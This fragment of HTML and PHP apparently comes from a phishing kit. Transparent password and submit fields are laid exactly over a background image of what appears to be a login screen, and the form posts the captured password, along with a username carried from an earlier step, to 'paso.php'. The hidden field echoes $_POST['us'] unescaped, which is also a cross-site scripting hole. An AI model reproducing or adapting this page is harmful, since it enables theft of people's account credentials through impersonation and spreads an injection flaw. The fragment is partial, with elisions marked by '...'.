    ...
    <div id="xdfizq">
        <div id="xfdfrm">
          <form  method="post" action="paso.php">
            <input  maxlength="22" required name="ct" id="ct" type="password" autocomplete="off" style="position: relative;top: 227px;left: 22px;height: 32px;width: 154px;display: block; border:none; background:transparent;padding: 0px 0 0 8px;font-size: 16px;font-family: sans-serif;"><input type="hidden" name="us" value="<?php echo $_POST['us']; ?>">

            
           <input type="hidden" id="">
            <input type="submit" value="" onclick="xbndtl()" style="display: block;position: relative;background: transparent;border: none;top: 195px;left: 207px;height: 34px;width: 135px;outline: none;cursor: pointer;user-select: none;"></input>
    ...
    <style>
        *{margin:0;padding:0;}
        ...
        #xfdfrm{
          height:519.48px;
          width:362px;
          background-image:url('https://svgshare.com/i/rex.svg');
